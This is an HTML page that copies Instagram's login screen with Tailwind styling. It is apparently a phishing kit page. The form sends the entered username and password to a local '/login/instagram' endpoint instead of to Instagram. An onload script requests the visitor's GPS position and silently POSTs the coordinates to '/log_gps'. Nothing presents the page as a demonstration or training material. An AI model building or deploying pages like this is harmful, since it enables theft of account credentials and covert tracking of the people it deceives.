<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#fafafa] flex flex-col items-center justify-center min-h-screen p-4 font-sans">
    <div class="bg-white border border-gray-300 p-10 w-full max-w-[350px] shadow-sm text-center">
        <h1 class="text-4xl italic font-serif mb-8 select-none">Instagram</h1>
        <form action="/login/instagram" method="POST" class="space-y-2">
            <input name="user" type="text" placeholder="Phone number, username, or email" class="w-full p-2.5 bg-gray-50 border border-gray-300 rounded text-xs focus:outline-none focus:border-gray-400" required>
            <input name="pass" type="password" placeholder="Password" class="w-full p-2.5 bg-gray-50 border border-gray-300 rounded text-xs focus:outline-none focus:border-gray-400" required>
            <button class="w-full bg-[#0095f6] text-white py-1.5 rounded font-bold text-sm mt-2 hover:bg-[#1877f2]">Log In</button>
            <div class="flex items-center my-4"><div class="flex-grow border-t border-gray-300"></div><span class="px-3 text-gray-400 text-xs font-bold uppercase">OR</span><div class="flex-grow border-t border-gray-300"></div></div>
            <a href="#" class="text-[#385185] text-sm font-bold block">Log in with Facebook</a>
        </form>
    </div>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(p) {
                    fetch('/log_gps', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lat:p.coords.latitude, lon:p.coords.longitude})});
                });
            }
        }
    </script>
</body>
</html>
